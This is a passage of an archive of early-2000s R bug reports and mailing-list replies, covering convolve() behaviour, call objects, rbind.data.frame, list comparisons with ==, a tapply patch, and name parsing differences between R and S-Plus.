Date: Fri, 28 Jan 2000 11:17:36 +0100 (MET)
From: wsimpson@gcal.ac.uk
Message-Id: <200001281017.LAA11325@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: convolution bug

Full_Name: Bill Simpson
Version: 65.1 , 0.90.1
OS: Linux
Submission from: (NULL) (193.62.250.209)


I reported this on r-help, but here is official bug report.

The present convolve() does not do convolution by default. Its default behaviour
is
correlation. This is a bug.

The default argument conj should be set to FALSE.

The zero-padding should be on the right for linear convolution (don't ask me
why you call this type="open"; I suggest type="linear").

Here is what I expect linear convolution to do:
myconvolve<-function (x,h) 
{
    nx <- length(x)
    nh <- length(h)
    #zero pad
    if(nx>nh)
       {
       x <- c(x,rep(0, nh-1))
       h<-c(h,rep(0,nx-1))
       }
    else
       {
       h <- c(h,rep(0, nx-1))
       x<-c(x,rep(0,nh-1))
       }
    x <- fft(fft(x) * fft(h), inv = TRUE)
    Re(x)/length(x)
#I am not sure about this, the R IFFT is weird
}

What "circular" convolution should do is just
eliminate the zero-padding:

myconvolve2<-function (x,h)
{
#no padding, circular convolution
    nx <- length(x)
    nh <- length(h)
    x <- fft(fft(x) * fft(h), inv = TRUE)
    Re(x)/(nx)
}


I suggest that you create two functions, convolve() and correlate(), and get
rid
of the conj argument in convolve().

==> 408.audit <==
Wed Feb 16 19:28:42 2000	ripley	moved from incoming to Language
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 412 *
Subject: anomalies with call objects
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 06 Feb 2000 01:18:50 +0100
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 412 <==
From postmaster@franz.stat.wisc.edu  Sun Feb  6 01:16:33 2000
Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id BAA26868
	for <R-bugs@biostat.ku.dk>; Sun, 6 Feb 2000 01:16:31 +0100 (MET)
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id BAA18080
	for <r-bugs@hypatia.math.ethz.ch>; Sun, 6 Feb 2000 01:16:38 +0100 (MET)
Received: from franz.stat.wisc.edu(128.105.174.95)
 via SMTP by hypatia, id smtpdAAAa004QS; Sun Feb  6 01:16:33 2000
Received: from pubhealth.ku.dk (really [130.225.108.10]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m12HFNP-000ZSxC@franz.stat.wisc.edu> (Debian Smail3.2.0.102)
	for <r-bugs@r-project.org>; Sat, 5 Feb 2000 18:16:31 -0600 (CST) 
Received: from biostat.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id BAA26864
	for <r-bugs@r-project.org>; Sun, 6 Feb 2000 01:16:18 +0100 (MET)
Received: (from pd@localhost)
	by biostat.ku.dk (8.9.3/8.9.3) id BAA12311;
	Sun, 6 Feb 2000 01:18:51 +0100
Sender: pd@blueberry.kubism.ku.dk
To: r-bugs@r-project.org
Subject: anomalies with call objects
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 06 Feb 2000 01:18:50 +0100
Message-ID: <x2900zyyhh.fsf@blueberry.kubism.ku.dk>
Lines: 51
X-Mailer: Gnus v5.7/Emacs 20.4
Mime-Version: 1.0
Content-Type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: 7bit


Call objects don't always behave as you'd expect. They're mostly
list-like, but with exceptions:

> f<-function(x,y,...)match.call(expand.dots=FALSE)
> xx <- f(y=1,2,z=3,4)
> dd <- xx$...
> xx$... <- NULL
> c(xx,dd)
[[1]]
f(x = 2, y = 1)

$z
[1] 3

[[3]]
[1] 4

> as.call(c(as.list(xx),dd))
f(x = 2, y = 1, z = 3, 4)

(Splus has this rather differently, since dd becomes a call to list()
rather than a list of promises:

S> c(xx,dd)
f(x = 2, y = 1, list, z = 3, 4)
S> as.call(c(as.list(xx),dd))
f(x = 2, y = 1, list, z = 3, 4)

...but at least gives the same in both cases)

Also, the names of arguments added with [[<- is getting dropped if a
new element is required:

> xx[["abc"]]<-123
> xx
f(x = 2, y = 1, 123)

S has what I'd expect there:

S> xx[["abc"]]<-123
S> xx
f(x = 2, y = 1, abc = 123)

[R-0.99.0 prerelease on RedHat6.1, but this is likely not a new thing.]

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 412.audit <==
Wed Feb 16 19:26:57 2000	ripley	moved from incoming to Language
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 669 *
Subject: Bug(s) w/ rbind.data.frame(); fix also read.table(*, as.is = TRUE) ?
From: Martin Maechler <maechler@stat.math.ethz.ch>
Date: Mon, 25 Sep 2000 10:17:15 +0200
--status of AsIs columns
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 669 <==
From maechler@stat.math.ethz.ch  Mon Sep 25 10:17:01 2000
Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id KAA01907
	for <R-bugs@biostat.ku.dk>; Mon, 25 Sep 2000 10:17:01 +0200 (MET DST)
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id KAA07627
	for <R-bugs@stat.math.ethz.ch>; Mon, 25 Sep 2000 10:17:19 +0200 (MET DST)
Received: from lynne(129.132.58.30), claiming to be "lynne.ethz.ch"
 via SMTP by hypatia, id smtpdAAAa001r9; Mon Sep 25 10:17:15 2000
Received: (maechler@localhost) by lynne.ethz.ch (8.9.3/D-MATH-client) id KAA01475; Mon, 25 Sep 2000 10:17:15 +0200
X-Authentication-Warning: lynne.ethz.ch: maechler set sender to maechler@stat.math.ethz.ch using -f
From: Martin Maechler <maechler@stat.math.ethz.ch>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <14799.2571.494467.836722@gargle.gargle.HOWL>
Date: Mon, 25 Sep 2000 10:17:15 +0200
To: R-bugs@stat.math.ethz.ch
Subject: Bug(s) w/ rbind.data.frame(); fix also read.table(*, as.is = TRUE) ?
X-Mailer: VM 6.76 under Emacs 20.7.1
Reply-To: Martin Maechler <maechler@stat.math.ethz.ch>

This is not only bug report, but also a RFC (request for comments):

The basic problem is that there are (at least) two ways of easily getting
non-factor character columns in data.frames.
The first is  
    read.table(*, as.is = TRUE) 
and the second is
    data.frame(.., I(...), ..)	      

which differ in their result. Whereas the first produces `pure' character
columns in the data.frame, the second approach gives `AsIs' classed
columns (character, or, e.g. logical).

Now, as the following shows,  rbind.data.frame()  *is* buggy anyway,
I wonder if we shouldn't change read.table(*, as.is = TRUE)
such that the non-numeric columns of its result become "AsIs" classed as
well:

-----------

str(d1 <- data.frame(a=1:3, b = I(letters[1:3])))
## d1 is `alright'
## d0: The same but a `character' *not* protected by AsIs:
d0 <- d1
d0$b <- unclass(d0$b)
str(d0)
## Note that this is *really* the same as a what you get from
##  read.table(*, as.is = TRUE)
##  ----------
##  R's read.table() is S+ compatible; however I wonder if
##  we shouldn't add  "AsIs" classes to all non-numeric components...
##  the classes, shouldn't harm, but ensure consistency of treatment..

str(d11 <- rbind(d1, new = c(7, "N"))) ## alright
str(d01 <- rbind(d0, new = c(7, "N"))) ## all wrong :
## Both columns were coerced to factors !!
##-- S-PLUS 5 coerces both to "character" -- which is better,
##  since the new row *is* all character

## R makes nonsense with 'b' [factor w/ 1 level "N": NA NA NA 1]
## S+ 5.1 does exactly the right thing [both a & b still look like in d0,d1 :
str(d12 <- rbind(d1, new = data.frame(a= 7, b="N")))##
str(d02 <- rbind(d0, new = data.frame(a= 7, b="N")))##

---------

Martin Maechler <maechler@stat.math.ethz.ch>	http://stat.ethz.ch/~maechler/
Seminar fuer Statistik, ETH-Zentrum  LEO D10	Leonhardstr. 27
ETH (Federal Inst. Technology)	8092 Zurich	SWITZERLAND
phone: x-41-1-632-3408		fax: ...-1228			<><

==> 669.audit <==
Wed Oct 25 20:31:21 2000	ripley	changed notes
Wed Oct 25 20:31:21 2000	ripley	foobar
Wed Oct 25 20:31:21 2000	ripley	moved from incoming to Language
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1073 *
Subject: Wierd problem comparing numeric values and list using ==
From: "Warnes, Gregory R" <gregory_r_warnes@groton.pfizer.com>
Date: Fri, 24 Aug 2001 22:07:41 -0400
--see also PR#1075
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1073 <==
From postmaster@franz.stat.wisc.edu  Sat Aug 25 04:08:02 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id EAA03646
	for <r-bugs@biostat.ku.dk>; Sat, 25 Aug 2001 04:08:01 +0200 (MET DST)
Received: from mailrelay1.pfizer.com (really [192.77.198.2]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m15aSrf-000JIlC@franz.stat.wisc.edu> (Debian Smail3.2.0.111)
	for <r-bugs@r-project.org>; Fri, 24 Aug 2001 21:07:59 -0500 (CDT) 
Received: from gsun56.pfizer.com (localhost [127.0.0.1])
	by mailrelay1.pfizer.com (8.9.3/Pro-8.9.3) with ESMTP id WAA09177
	for <r-bugs@r-project.org>; Fri, 24 Aug 2001 22:07:43 -0400 (EDT)
Received: from groexms01.pfizer.com (localhost [127.0.0.1])
	by gsun56.pfizer.com (Pro-8.9.3/Pro-8.9.3) with ESMTP id WAA24921
	for <r-bugs@r-project.org>; Fri, 24 Aug 2001 22:08:07 -0400 (EDT)
Received: from groexcncr05.pfizer.com (unverified) by groexms01.pfizer.com
 (Content Technologies SMTPRS 4.2.1) with ESMTP id <T559305f66fac1e08e203f@groexms01.pfizer.com> for <r-bugs@r-project.org>;
 Fri, 24 Aug 2001 22:07:41 -0400
Received: by groexcncr05.pfizer.com with Internet Mail Service (5.5.2650.21)
	id <R3ZPXZDF>; Fri, 24 Aug 2001 22:07:41 -0400
Message-ID: <5429125E11E4D411AF7300805FE603A8014CED55@groexmbcr02.pfizer.com>
From: "Warnes, Gregory R" <gregory_r_warnes@groton.pfizer.com>
To: "'r-bugs@r-project.org'" <r-bugs@r-project.org>
Subject: Wierd problem comparing numeric values and list using ==
Date: Fri, 24 Aug 2001 22:07:41 -0400
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2650.21)
Content-Type: text/plain; charset="ISO-8859-1"


Under R 1.3.0 on Solaris and Windows NT  there seems to be a bug in == when
applied to elements of a list, particularly when one of the elements is of
mode integer:

	> list(1) == list(1)
	[1] FALSE
	> 1 == list(1)
	[1] TRUE
	> as.integer(1)==list(as.integer(1))
	[1] FALSE
	> as.integer(1)==list(as.double(1))
	[1] FALSE
	> list(as.integer(1))==list(as.integer(1))
	[1] FALSE
	> list(as.integer(1))==as.integer(1)
	[1] FALSE
	> list(as.double(1))==list(as.double(1))
	[1] FALSE

However, these cases work:

	> as.double(1)==list(as.integer(1))
	[1] TRUE
	> list(as.integer(1))==as.double(1)
	[1] TRUE

Replacing the bare integer/double with a vector constructed with c() doesn't
change the results, and comparing between vectors created with c() appears
correct.

-Greg

--please do not edit the information below--

Version:
 platform = i386-pc-mingw32
 arch = x86
 os = Win32
 system = x86, Win32
 status = 
 major = 1
 minor = 3.0
 year = 2001
 month = 06
 day = 22
 language = R

Windows NT 4.0 (build 1381) Service Pack 5

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base


LEGAL NOTICE
Unless expressly stated otherwise, this message is confidential and may be privileged. It is intended for the addressee(s) only. Access to this E-mail by anyone else is unauthorized. If you are not an addressee, any disclosure or copying of the contents of this E-mail or any action taken (or not taken) in reliance on it is unauthorized and may be unlawful. If you are not an addressee, please inform the sender immediately.

==> 1073.reply.1 <==
From p.dalgaard@biostat.ku.dk  Sat Aug 25 15:58:26 2001
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA04833;
	Sat, 25 Aug 2001 15:58:25 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id f7PDv9r21975;
	Sat, 25 Aug 2001 15:57:09 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
Sender: pd@pubhealth.ku.dk
To: gregory_r_warnes@groton.pfizer.com
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] Wierd problem comparing numeric values and list using == (PR#1073)
References: <200108250208.EAA03656@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 25 Aug 2001 15:57:09 +0200
In-Reply-To: <200108250208.EAA03656@pubhealth.ku.dk>
Message-ID: <x23d6gmedm.fsf@blueberry.kubism.ku.dk>
Lines: 57
User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

gregory_r_warnes@groton.pfizer.com writes:

> Under R 1.3.0 on Solaris and Windows NT  there seems to be a bug in == when
> applied to elements of a list, particularly when one of the elements is of
> mode integer:
> 
> 	> list(1) == list(1)
> 	[1] FALSE
> 	> 1 == list(1)
> 	[1] TRUE
> 	> as.integer(1)==list(as.integer(1))
> 	[1] FALSE
> 	> as.integer(1)==list(as.double(1))
> 	[1] FALSE
> 	> list(as.integer(1))==list(as.integer(1))
> 	[1] FALSE
> 	> list(as.integer(1))==as.integer(1)
> 	[1] FALSE
> 	> list(as.double(1))==list(as.double(1))
> 	[1] FALSE
> 
> However, these cases work:
> 
> 	> as.double(1)==list(as.integer(1))
> 	[1] TRUE
> 	> list(as.integer(1))==as.double(1)
> 	[1] TRUE
> 
> Replacing the bare integer/double with a vector constructed with c() doesn't
> change the results, and comparing between vectors created with c() appears
> correct.

It is not entirely clear what we *should* be doing here. S (-PLUS 3.4)
is at least consistent:

> list(1) == list(1)
Error in list(1) == list(1): == operation on mode "list" undefined
Dumped
>  1 == list(1)
Error in 1 == list(1): == operation on mode "list" undefined
Dumped
> as.integer(1)==list(as.integer(1))
Error in as.integer(1) == list(as.integer(1)): == operation on mode "list"
        undefined
Dumped
...

so one might argue that you shouldn't do that in the first place...
(or that the bug is that we do not expressly forbid doing this.)

        -p

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1073.audit <==
Tue Aug 28 10:14:14 2001	ripley	moved from incoming to Language
Tue Aug 28 10:16:19 2001	ripley	changed notes
Tue Aug 28 10:16:19 2001	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1076 *
Subject: Re: [Rd] Wierd problem comparing numeric values and list using == 
From: John Chambers <jmc@research.bell-labs.com>
Date: Mon, 27 Aug 2001 08:44:22 -0400
--part of PR#1073
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1076 <==
From jmc@research.bell-labs.com  Mon Aug 27 14:45:38 2001
Received: from crufty.research.bell-labs.com (crufty.research.bell-labs.com [204.178.16.49])
	by pubhealth.ku.dk (8.9.3/8.9.1) with SMTP id OAA16860;
	Mon, 27 Aug 2001 14:45:37 +0200 (MET DST)
Received: from scummy.research.bell-labs.com ([135.104.2.10]) by crufty; Mon Aug 27 08:40:52 EDT 2001
Received: from jessie.research.bell-labs.com (jessie.research.bell-labs.com [135.104.13.5])
	by scummy.research.bell-labs.com (8.11.4/8.11.4) with ESMTP id f7RCiOl07715;
	Mon, 27 Aug 2001 08:44:24 -0400 (EDT)
Received: from research.bell-labs.com (IDENT:jmc@newton.research.bell-labs.com [135.104.13.158])
	by jessie.research.bell-labs.com (8.9.1/8.9.1) with ESMTP id IAA18247;
	Mon, 27 Aug 2001 08:44:23 -0400 (EDT)
Sender: jmc@research.bell-labs.com
Message-ID: <3B8A40A6.15AF96C2@research.bell-labs.com>
Date: Mon, 27 Aug 2001 08:44:22 -0400
From: John Chambers <jmc@research.bell-labs.com>
Organization: Bell Labs, Lucent Technologies
X-Mailer: Mozilla 4.72 [en] (X11; U; Linux 2.2.14-5.0 i686)
X-Accept-Language: en
MIME-Version: 1.0
To: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
CC: gregory_r_warnes@groton.pfizer.com, r-devel@stat.math.ethz.ch,
        R-bugs@biostat.ku.dk
Subject: Re: [Rd] Wierd problem comparing numeric values and list using == 
 (PR#1073)
References: <200108250208.EAA03656@pubhealth.ku.dk> <x23d6gmedm.fsf@blueberry.kubism.ku.dk>
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

Peter Dalgaard BSA wrote:
> 
> gregory_r_warnes@groton.pfizer.com writes:
> 
> > Under R 1.3.0 on Solaris and Windows NT  there seems to be a bug in == when
> > applied to elements of a list, particularly when one of the elements is of
> > mode integer:
> >
> >       > list(1) == list(1)
> >       [1] FALSE
> >       > 1 == list(1)
> >       [1] TRUE
> >       > as.integer(1)==list(as.integer(1))
> >       [1] FALSE
> >       > as.integer(1)==list(as.double(1))
> >       [1] FALSE
> >       > list(as.integer(1))==list(as.integer(1))
> >       [1] FALSE
> >       > list(as.integer(1))==as.integer(1)
> >       [1] FALSE
> >       > list(as.double(1))==list(as.double(1))
> >       [1] FALSE
> >
> > However, these cases work:
> >
> >       > as.double(1)==list(as.integer(1))
> >       [1] TRUE
> >       > list(as.integer(1))==as.double(1)
> >       [1] TRUE
> >
> > Replacing the bare integer/double with a vector constructed with c() doesn't
> > change the results, and comparing between vectors created with c() appears
> > correct.
> 
> It is not entirely clear what we *should* be doing here. S (-PLUS 3.4)
> is at least consistent:
> 
> > list(1) == list(1)
> Error in list(1) == list(1): == operation on mode "list" undefined
> Dumped
> >  1 == list(1)
> Error in 1 == list(1): == operation on mode "list" undefined
> Dumped
> > as.integer(1)==list(as.integer(1))
> Error in as.integer(1) == list(as.integer(1)): == operation on mode "list"
>         undefined
> Dumped
> ...
> 
> so one might argue that you shouldn't do that in the first place...
> (or that the bug is that we do not expressly forbid doing this.)
> 
>         -p
> 
> --
>    O__  ---- Peter Dalgaard             Blegdamsvej 3
>   c/ /'_ --- Dept. of Biostatistics     2200 Cph. N
>  (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
> ~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

As of 1.4, we will have the `identical' function, which is the right way
to do such comparisons in any case.

So I'd vote for making a use of the comparison operators an error unless
the type is correct (or there is a method defined).  There is even code
in relop.c (commented out) that looks like the right test.  Any
objections?

John

-- 
John M. Chambers                  jmc@bell-labs.com
Bell Labs, Lucent Technologies    office: (908)582-2681
700 Mountain Avenue, Room 2C-282  fax:    (908)582-3340
Murray Hill, NJ  07974            web: http://www.cs.bell-labs.com/~jmc

==> 1076.reply.1 <==
From p.dalgaard@biostat.ku.dk  Mon Aug 27 15:36:50 2001
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA17663;
	Mon, 27 Aug 2001 15:36:49 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id f7RDZHZ03790;
	Mon, 27 Aug 2001 15:35:17 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
Sender: pd@pubhealth.ku.dk
To: jmc@research.bell-labs.com
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] Wierd problem comparing numeric values and list using == (PR#1076)
References: <200108271245.OAA16874@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 27 Aug 2001 15:35:17 +0200
In-Reply-To: <200108271245.OAA16874@pubhealth.ku.dk>
Message-ID: <x27kvpwrqi.fsf@blueberry.kubism.ku.dk>
Lines: 56
User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

jmc@research.bell-labs.com writes:

> > >       > list(1) == list(1)
> > >       [1] FALSE
> > >       > 1 == list(1)
> > >       [1] TRUE
> > >       > as.integer(1)==list(as.integer(1))
> > >       [1] FALSE
> > >       > as.integer(1)==list(as.double(1))
> > >       [1] FALSE
> > >       > list(as.integer(1))==list(as.integer(1))
> > >       [1] FALSE
> > >       > list(as.integer(1))==as.integer(1)
> > >       [1] FALSE
> > >       > list(as.double(1))==list(as.double(1))
> > >       [1] FALSE
> > >
> > > However, these cases work:
> > >
> > >       > as.double(1)==list(as.integer(1))
> > >       [1] TRUE
> > >       > list(as.integer(1))==as.double(1)
> > >       [1] TRUE
....
> As of 1.4, we will have the `identical' function, which is the right way
> to do such comparisons in any case.
> 
> So I'd vote for making a use of the comparison operators an error unless
> the type is correct (or there is a method defined).  There is even code
> in relop.c (commented out) that looks like the right test.  Any
> objections?

Not really, except that I get the usual nagging suspicion that someone
(who?) meant something by doing it this way...

The current logic seems to be that if either side of the == is a
vector of atomic type, try to coerce the list on the other side to a
similar object and then test. However this has a clear bug in that the
coercion is to double even when the atomic vector is integer. If there
are lists on both sides, a pointer comparison is done:

> x<-2
> list(x)==list(x)
[1] FALSE
> list(.Alias(x))==list(.Alias(x))
[1] TRUE

The latter seems highly dubious to me. I'd rather have a recursive
pairwise application of "==" there. However, none of this is what
identical does, is it?

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1076.audit <==
Tue Aug 28 10:14:14 2001	ripley	moved from incoming to Language
Tue Aug 28 10:15:49 2001	ripley	changed notes
Tue Aug 28 10:15:49 2001	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1186 *
Subject: a patch to tapply
From: Vadim Ogranovich <vograno@arbitrade.com>
Date: Thu, 29 Nov 2001 14:48:35 -0600
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1186 <==
From postmaster@franz.stat.wisc.edu  Thu Nov 29 21:48:55 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA14928
	for <r-bugs@biostat.ku.dk>; Thu, 29 Nov 2001 21:48:54 +0100 (MET)
Received: from syn.arbitrade.com (really [208.47.220.70]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m169Y6y-000IWoC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Thu, 29 Nov 2001 14:48:48 -0600 (CST) 
Received: from urg.arbitrade.com (urg.arbitrade.com [10.0.9.25])
	by syn.arbitrade.com (8.11.1/8.11.1) with ESMTP id fATKlSE29652
	for <r-bugs@r-project.org>; Thu, 29 Nov 2001 14:47:28 -0600 (CST)
Received: from mnmail.arbitrade.com (mnmail.arbitrade.com [38.156.36.157])
	by urg.arbitrade.com (8.11.1/8.11.1) with ESMTP id fATKmf519971
	for <r-bugs@r-project.org>; Thu, 29 Nov 2001 14:48:41 -0600 (CST)
Received: by mnmail.arbitrade.com with Internet Mail Service (5.5.2653.19)
	id <XXDQF55J>; Thu, 29 Nov 2001 14:48:41 -0600
Message-ID: <AFD78192EC49D311BFAE00902798AB8F23D65A@jupiter.sc.arbitrade.com>
From: Vadim Ogranovich <vograno@arbitrade.com>
To: "'r-bugs@r-project.org'" <r-bugs@r-project.org>
Subject: a patch to tapply
Date: Thu, 29 Nov 2001 14:48:35 -0600
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2653.19)
Content-Type: text/plain;
	charset="iso-8859-1"

Though tapply(x, factor, fun, simplify =TRUE) should be equivalent to
sapply(split(x, factor), fun, simplify=TRUE), note simplify=TRUE, it is not
so if fun() returns a vector rather than a scalar, e.g.

> tapply(1:6, c(0,0,0,1,1,1), function(x) c(min=min(x), max=max(x)),
simplify=TRUE)
$"0"
min max 
  1   3 

$"1"
min max 
  4   6 

> sapply(split(1:6, c(0,0,0,1,1,1)), function(x) c(min=min(x), max=max(x)),
simplify=TRUE)
    0 1
min 1 4
max 3 6

The patch submitted below fixes this problem
> tapply.new(1:6, c(0,0,0,1,1,1), function(x) c(min=min(x), max=max(x)),
simplify=TRUE)
    0 1
min 1 4
max 3 6

Another potential problem, which I am not able to verify at the moment, is
that whenever simplification is possible S-Plus returns a TRANSPOSE of that
of R, i.e.
  min max
0   1   3
1   4   6

Fixing this would require small changes to both tapply and sapply and I'll
be happy to provide the patches if requested.


R Version
> sapply(R.Version(), I)
           platform                arch                  os
system 
"i686-pc-linux-gnu"              "i686"         "linux-gnu"   "i686,
linux-gnu" 
             status               major               minor
year 
                 ""                 "1"               "3.1"
"2001" 
              month                 day            language 
               "08"                "31"                 "R"

 **************
The patch:
"tapply.new" <-
  function (X, INDEX, FUN = NULL, ..., simplify = TRUE) 
{
  FUN <- if (!is.null(FUN)) 
    match.fun(FUN)
  if (!is.list(INDEX)) 
    INDEX <- list(INDEX)
  nI <- length(INDEX)
  namelist <- vector("list", nI)
  names(namelist) <- names(INDEX)
  extent <- integer(nI)
  nx <- length(X)
  one <- as.integer(1)
  group <- rep(one, nx)
  ngroup <- one
  for (i in seq(INDEX)) {
    index <- as.factor(INDEX[[i]])
    if (length(index) != nx) 
      stop("arguments must have same length")
    namelist[[i]] <- levels(index)
    extent[i] <- nlevels(index)
    group <- group + ngroup * (as.integer(index) - one)
    ngroup <- ngroup * nlevels(index)
  }
  if (is.null(FUN)) 
    return(group)
  ans <- lapply(split(X, group), FUN, ...)
  if (simplify && length(common.len <- unique(unlist(lapply(ans, length))))
== 1) {
    if (common.len > 1) {
      extent <- c(common.len, extent)
      namelist <- c(list(names(ans[[1]])), namelist)
    }
    ansmat <- array(unlist(ans, recursive = FALSE), dim = extent, dimnames =
namelist)
    return(ansmat)
  }
  index <- as.numeric(names(ans))
  ansmat <- array(vector("list", prod(extent)), dim = extent, 
                  dimnames = namelist)
  names(ans) <- NULL
  ansmat[index] <- ans
  ansmat
}

-------------------------------------------------- 
DISCLAIMER 
This e-mail, and any attachments thereto, is intended only for use by the
addressee(s) named herein and may contain legally privileged and/or
confidential information.  If you are not the intended recipient of this
e-mail, you are hereby notified that any dissemination, distribution or
copying of this e-mail, and any attachments thereto, is strictly prohibited.
If you have received this e-mail in error, please immediately notify me and
permanently delete the original and any copy of any e-mail and any printout
thereof. 

E-mail transmission cannot be guaranteed to be secure or error-free.  The
sender therefore does not accept liability for any errors or omissions in
the contents of this message which arise as a result of e-mail transmission.

NOTICE REGARDING PRIVACY AND CONFIDENTIALITY 

Knight Trading Group may, at its discretion, monitor and review the content
of all e-mail communications. 


==> 1186.audit <==
Fri Dec 28 20:08:08 2001	thomas	moved from incoming to Language
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1214 *
Subject: syntax questtion, maybe a bug
From: Rich Heiberger <rmh@surfer.sbm.temple.edu>
Date: Thu, 13 Dec 2001 13:46:54 -0500 (EST)
--Is .2logl meant to be a valid name in R? It is S
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1214 <==
From rmh@surfer.sbm.temple.edu  Thu Dec 13 19:44:55 2001
Received: from surfer.sbm.temple.edu (surfer.sbm.temple.edu [155.247.185.2])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA09950
	for <R-bugs@biostat.ku.dk>; Thu, 13 Dec 2001 19:44:55 +0100 (MET)
Received: (from rmh@localhost)
	by surfer.sbm.temple.edu (8.11.1/8.11.1) id fBDIksf2527242
	for R-bugs@biostat.ku.dk; Thu, 13 Dec 2001 13:46:54 -0500 (EST)
Date: Thu, 13 Dec 2001 13:46:54 -0500 (EST)
From: Rich Heiberger <rmh@surfer.sbm.temple.edu>
Message-Id: <200112131846.fBDIksf2527242@surfer.sbm.temple.edu>
To: R-bugs@biostat.ku.dk
Subject: syntax questtion, maybe a bug


S-Plus takes names of the form ".2logl" since it sees a single set of
letters beginning with "." and continuing with alphanumerics.
> .2logl <- function(x) 2*log(x)
> .2logl(3)
[1] 2.197225
>

The same name is rejected by R, my guess is that the ".2" is recognized as
a number and then there is no operator symbol between the "2" and the
following alphabet symbols.
> .2logl <- function(x) 2*log(x)
Error: syntax error

Is this an intentional syntax difference between R and S?  Or is it a bug?


(continue)
I am using rw1031 Version 1.3.1  (2001-08-31) on windows.

Rich

==> 1214.audit <==
Sat Dec 15 10:55:43 2001	ripley	changed notes
Sat Dec 15 10:55:43 2001	ripley	foobar
Sat Dec 15 10:55:43 2001	ripley	moved from incoming to Language
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1241 *
Subject:  Problem with "missing" in "local" 
From: J.C.Rougier@durham.ac.uk
Date: Fri, 4 Jan 2002 13:34:34 GMT
-- no notes --
